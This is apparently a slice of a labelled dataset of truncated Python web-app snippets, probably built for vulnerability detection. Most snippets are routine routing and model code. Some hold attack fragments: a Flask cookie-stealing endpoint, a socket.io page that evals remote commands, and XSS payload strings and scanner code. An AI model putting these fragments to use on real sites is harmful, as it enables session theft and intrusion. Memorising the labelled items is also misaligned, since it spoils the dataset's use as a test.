53916, "code": " def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith", "label": 0}, {"snippet_id": 43590, "code": "\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key]", "label": 0}, {"snippet_id": 21164, "code": "'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/", "label": 0}, {"snippet_id": 41391, "code": ")) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1", "label": 0}, {"snippet_id": 53301, "code": ") return job_id except RestException, ex: raise PopupException(_(\"Error submitting coordinator %s\") %(coordinator,), detail=ex._headers.get('oozie-error-message', ex)) def list_editor_bundles(request):", "label": 0}, {"snippet_id": 7731, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>", "label": 0}, {"snippet_id": 28578, "code": "' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy') ", "label": 0}, {"snippet_id": 8522, "code": "', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$", "label": 0}, {"snippet_id": 52874, "code": " if 'Max retries exceeded with url' in str(detail): detail='%s: %s' %(_('The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %", "label": 0}, {"snippet_id": 22858, "code": "', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index", "label": 1}, {"snippet_id": 30566, "code": ": \t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \telse: \t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail", "label": 0}, {"snippet_id": 3993, "code": ".headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?',", "label": 0}, {"snippet_id": 49859, "code": " def root(): return render_template(\"home.html\") @app.route(\"/interact\", methods=[\"POST\"]) def vuln(): msg=request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu'", "label": 1}, {"snippet_id": 15993, "code": ") @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler", "label": 0}, {"snippet_id": 38693, "code": " get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter", "label": 0}, {"snippet_id": 33526, "code": ".blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content", "label": 0}, {"snippet_id": 2001, "code": ") decoded_payload=xss_payload_decode(payload) if host_header_xss.text.find(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result", "label": 0}, {"snippet_id": 49835, "code": ",methods=['GET']) def shell(): return html @socketio.on('sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(\"getMSG\",command+\"\\n\") if command==\"exit\": exit() if", "label": 0}, {"snippet_id": 43533, "code": "=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default)", "label": 0}, {"snippet_id": 23229, "code": "'open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 16287, "code": "': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$", "label": 0}, {"snippet_id": 51714, "code": "), 'items':[ {'name': 'auth.user'}, {'name': 'auth.group'}, {'name': 'constance.config', 'label': _('Configuration')}, ]}, {'label': _('Dashboard'), 'items':[ {'name': 'internet_nl_dashboard.account'},", "label": 1}, {"snippet_id": 18708, "code": "'ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns ", "label": 0}, {"snippet_id": 4452, "code": " 'e': '\\u0435', 'h': '\\u04BB', 'i': '\\u0456', 'j': '\\u0458', 'l': '\\u04CF', 'o': '\\u043E', 'p': '\\u0440', 'r': '\\u0433', 'q': '\\u051B', 's': '\\u0455', 'w': '\\u051D', 'x': '\\u0445', 'y': '\\u0443', } def", "label": 0}, {"snippet_id": 27204, "code": "+)\"', line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype: rtype=m_reqtype.group(1) print \"[+] Form detected. Method", "label": 1}, {"snippet_id": 3310, "code": "} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss", "label": 0}, {"snippet_id": 15723, "code": ".\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If", "label": 0}, {"snippet_id": 16143, "code": "'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error", "label": 0}, {"snippet_id": 45616, "code": "{'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data", "label": 0}, {"snippet_id": 10544, "code": " dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self", "label": 0}, {"snippet_id": 6079, "code": "' 'password_reset_link': ' 'default_language': 'en', 'base_url': None, 'default_eppn_scope': None, 'authn_info_mongo_uri': None, 'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation", "label": 0}, {"snippet_id": 9536, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$'", "label": 0}, {"snippet_id": 22494, "code": ".views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views", "label": 0}, {"snippet_id": 43870, "code": "): \t\t\t\t\tself.parent_doc.get_latest() \t\t\t\t\tref_doc=[d for d in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set", "label": 0}, {"snippet_id": 6659, "code": ":rtype: list[string] \"\"\" if self._parsed_status_test_usernames: return self._parsed_status_test_usernames value=self.config.get(self.section, 'status_test_usernames') res=[x.strip() for x in value.split(", "label": 0}, {"snippet_id": 54926, "code": " translated_resource in translated_resources: projects.add(translated_resource.resource.project) translated_resource.calculate_stats(save=False) bulk_update(translated_resources, update_fields=[ 'total_strings", "label": 0}, {"snippet_id": 39818, "code": "\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values", "label": 0}, {"snippet_id": 42292, "code": ".doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str", "label": 0}, {"snippet_id": 35754, "code": " \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t", "label": 0}, {"snippet_id": 2978, "code": "} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param", "label": 0}, {"snippet_id": 1403, "code": ": data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass", "label": 0}, {"snippet_id": 5031, "code": "<button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'", "label": 0}, {"snippet_id": 28176, "code": " +\".cfg\" if serv is not None and form.getvalue('open') is not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept: \t\tpass \t \terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf=open(cfg, ", "label": 0}, {"snippet_id": 2690, "code": " temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable", "label": 0}, {"snippet_id": 17072, "code": " 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r", "label": 0}, {"snippet_id": 18905, "code": "?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url", "label": 0}, {"snippet_id": 5722, "code": "=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>', '<scriscriptpt>alert(/xss/)</scriscriptpt>', '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be' ", "label": 0}, {"snippet_id": 7202, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\"", "label": 0}, {"snippet_id": 42890, "code": " not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name", "label": 0}, {"snippet_id": 15990, "code": ".format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler", "label": 0}, {"snippet_id": 53798, "code": "/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script] >_ \")) print(str(result) +", "label": 1}, {"snippet_id": 9888, "code": "'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS", "label": 0}, {"snippet_id": 46477, "code": " search.') return JsonResponse(response) def no_collections(request): return render('no_collections.mako', request,{'is_embeddable': request.GET.get('is_embeddable', False)}) def admin_collections(request", "label": 0}, {"snippet_id": 31766, "code": "+form.getvalue('color')+\"/\"+list_name \ttry: \t\topen(list, 'a').close() \t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError as e: ", "label": 0}, {"snippet_id": 52853, "code": " jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex: detail=ex._headers.get('oozie-error-message', ex) if", "label": 0}, {"snippet_id": 48835, "code": "=getattr(self.model, self.field_name) except AttributeError as e: return self.field_name.title() if callable(field) and getattr(field, 'short_description', False): return field.short_description return self", "label": 0}, {"snippet_id": 27157, "code": ".match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I) if m_value: hidden_param_name.append(m_input.group(2)) hidden_param_value.append(m_value.group(2)) else: params.append(m_input.group(2", "label": 1}, {"snippet_id": 40425, "code": ", fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular", "label": 0}, {"snippet_id": 24313, "code": "-directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up tasks(e", "label": 0}, {"snippet_id": 19251, "code": ")) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec", "label": 0}, {"snippet_id": 29460, "code": " --reload') \treturn firewalld_commands \t def check_haproxy_config(serv): \timport sql \tcommands=[ \"haproxy -q -c -f %s\" % sql.get_setting('haproxy_config_path')] \tssh=ssh_connect(serv) \tfor command in commands", "label": 0}, {"snippet_id": 25569, "code": " arguments: :param cartpos: The cart position the form should be for :param event: The event this belongs to \"\"\" cartpos=self.cartpos=kwargs.pop('cartpos', None) orderpos=self.orderpos=kwargs.pop('orderpos", "label": 0}, {"snippet_id": 18149, "code": "=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course", "label": 0}, {"snippet_id": 995, "code": ".text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query", "label": 1}, {"snippet_id": 22469, "code": "\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx", "label": 0}, {"snippet_id": 17205, "code": "<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses", "label": 0}, {"snippet_id": 10963, "code": ".num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self", "label": 0}, {"snippet_id": 41099, "code": " context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype", "label": 0}, {"snippet_id": 11639, "code": " url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib", "label": 0}, {"snippet_id": 39296, "code": " the document(with valid columns) in the database.\"\"\" \t\tif not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe", "label": 0}, {"snippet_id": 1481, "code": " apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder", "label": 1}, {"snippet_id": 18472, "code": ", url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading", "label": 0}, {"snippet_id": 27832, "code": "'accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, status) else: if status==403 or status==401: self.render_forbidden(exception.message) else: self.render('error.html',", "label": 0}, {"snippet_id": 18473, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading", "label": 0}, {"snippet_id": 4431, "code": " element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" % self", "label": 0}, {"snippet_id": 32136, "code": " case-insensitive search.\"\"\" q=filter_string.lower() return[mapping for mapping in mappings if q in mapping.ud.lower()] def get_rules_as_json(mapping): rules=getattr(mapping, 'rules', None) if rules: rules", "label": 0}, {"snippet_id": 33803, "code": ".format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name", "label": 1}, {"snippet_id": 48727, "code": "['srid']))) else: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"]))) else: return HttpResponseRedirect(\"/admin?error=Missing%20reservation%20id%20in%20request\"", "label": 0}, {"snippet_id": 40040, "code": "\tvalue =values.get(fieldname) \t\t\tif self.get(fieldname) !=value: \t\t\t\tfrappe.throw(_(\"Value cannot be changed for{0}\").format(self.meta.get_label(fieldname)), \t\t\t\t\tfrappe.CannotChangeConstantError) \tdef", "label": 0}, {"snippet_id": 1223, "code": "'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid", "label": 0}, {"snippet_id": 44908, "code": "'status': -1} try: workflow_json=json.loads(request.POST.get('workflow', '{}')) workflow=Workflow(workflow=workflow_json) response['status']=0 response['xml']=workflow.to_xml() except Exception, e: response", "label": 0}, {"snippet_id": 20702, "code": ".index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student", "label": 0}, {"snippet_id": 31467, "code": " \"sess_rate\", source=source, alpha=0.5, color=\" \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \tplots=[] \tfor key, value in p.items(): \t\tplots", "label": 0}, {"snippet_id": 47884, "code": " logging.log(logging.INFO, \"Failed to set password for: \" +user.displayName) au.email=mail au.save() user.save() else: username=str(request.POST[\"username\"]) displayname=str(request.POST[\"display_name\"]) dect", "label": 1}, {"snippet_id": 52883, "code": "'The Oozie server is not running'), detail) LOG.error(smart_str(detail)) raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow", "label": 0}, {"snippet_id": 47793, "code": " return HttpResponseForbidden() profile=Profile.objects.get(authuser=request.user) if profile.rights < 2: return HttpResponseForbidden() try: if request.GET.get(\"user_id\"): pid=int(request.GET[\"user_id", "label": 0}, {"snippet_id": 26091, "code": ".initial['is_business']=True self.fields['is_business'].widget=BusinessBooleanRadio(require_business=True) self.fields['company'].required=True self.fields['company'].widget.is_required=True self.fields", "label": 0}, {"snippet_id": 49811, "code": ".getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black>[\"+data+\"]</font>\"; try{ output=eval(data)+\"\" } catch(e){ output=e+\"\" } socket.emit('sendMSG',output) }) </script> ''' @app.route('/',methods=['GET", "label": 1}, {"snippet_id": 11894, "code": "\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view", "label": 0}, {"snippet_id": 22950, "code": "/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/", "label": 0}, {"snippet_id": 39252, "code": "): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname", "label": 0}, {"snippet_id": 6201, "code": " should probably be about 2x number of cores to 4x number of cores(if hyperthreading is available). \"\"\" return self.config.getint(self.section, 'num_threads') @property def logdir(self): \"\"\" Path to CherryPy", "label": 0}, {"snippet_id": 20895, "code": "/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if", "label": 0}, {"snippet_id": 16344, "code": "\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url", "label": 0}, {"snippet_id": 38278, "code": ".blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe", "label": 0}, {"snippet_id": 4714, "code": ", 'onerror', 'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage'", "label": 0}, {"snippet_id": 24236, "code": " test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh", "label": 0}, {"snippet_id": 52433, "code": "'doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads", "label": 0}, {"snippet_id": 17529, "code": "'ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 44197, "code": " from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2", "label": 0}, {"snippet_id": 3643, "code": " xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT'", "label": 0}, {"snippet_id": 35301, "code": ".strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg", "label": 0}, {"snippet_id": 28205, "code": ".read() \t\tconf.close \texcept IOError: \t\terror +='<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old\" %(cfg, cfg))\t if serv is not None and form.getvalue('config') is not None: \ttry: \t\tfunct", "label": 0}, {"snippet_id": 36396, "code": " display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get('parent_doc'): \t\t\t\t\tself.parent_doc.get_latest(", "label": 0}, {"snippet_id": 48720, "code": "(int(request.GET[\"rid\"])) +\\ '&srid=' +str(int(request.GET['srid']))) else: response=HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"]))) else: return HttpResponseRedirect", "label": 0}, {"snippet_id": 14876, "code": ", expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2", "label": 0}, {"snippet_id": 42015, "code": ".parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value, BaseDocument): \t\t\tif \"doctype\" not in value: \t\t\t\tvalue[\"doctype\"]=self.get_table_field_doctype", "label": 0}, {"snippet_id": 31115, "code": "\terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \t \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path", "label": 0}, {"snippet_id": 8778, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r", "label": 0}, {"snippet_id": 5987, "code": "=0.5.3', ] testing_extras=[ 'nose==1.2.1', 'coverage==3.6', ] setup(name='eduid_idp', version=version, description=\"eduID SAML frontend IdP\", long_description=README, classifiers=[ ], keywords='eduID SAML", "label": 0}, {"snippet_id": 30237, "code": "') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page') \t \tpostdata={ \t\t'action': form.getvalue('action'), \t\t's': form.getvalue('s'), \t\t'b': form.getvalue('b') \t} \theaders", "label": 0}, {"snippet_id": 33469, "code": "\n from __future__ import unicode_literals import frappe from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils", "label": 1}, {"snippet_id": 45897, "code": " django.utils.translation import ugettext as _ from django.core.urlresolvers import reverse from desktop.conf import USE_NEW_EDITOR from desktop.lib.django_util import JsonResponse, render from desktop", "label": 0}, {"snippet_id": 44130, "code": ".search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS<", "label": 1}, {"snippet_id": 31248, "code": "\tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker \tfrom bokeh.layouts import widgetbox, gridplot \tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select", "label": 0}, {"snippet_id": 51946, "code": "/../vendor/') +'/') if DEBUG: DATA_UPLOAD_MAX_NUMBER_FIELDS=10000 STATICFILES_FINDERS=( 'django.contrib.staticfiles.finders.FileSystemFinder', 'django.contrib.staticfiles.finders.AppDirectoriesFinder',", "label": 0}, {"snippet_id": 39652, "code": ")) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef", "label": 0}, {"snippet_id": 45813, "code": " uuid__in=[b['coordinator'] for b in bundle.data['coordinators']])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies", "label": 0}, {"snippet_id": 30620, "code": ".get_config_var('main', 'log_path') \trows=form.getvalue('rows2') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue", "label": 0}, {"snippet_id": 28766, "code": "\tsys.exit() \t\t\t\t def ssh_connect(serv, **kwargs): \timport paramiko \tfrom paramiko import SSHClient \timport sql \tfullpath=get_config_var('main', 'fullpath') \tssh_enable='' \tssh_port='' 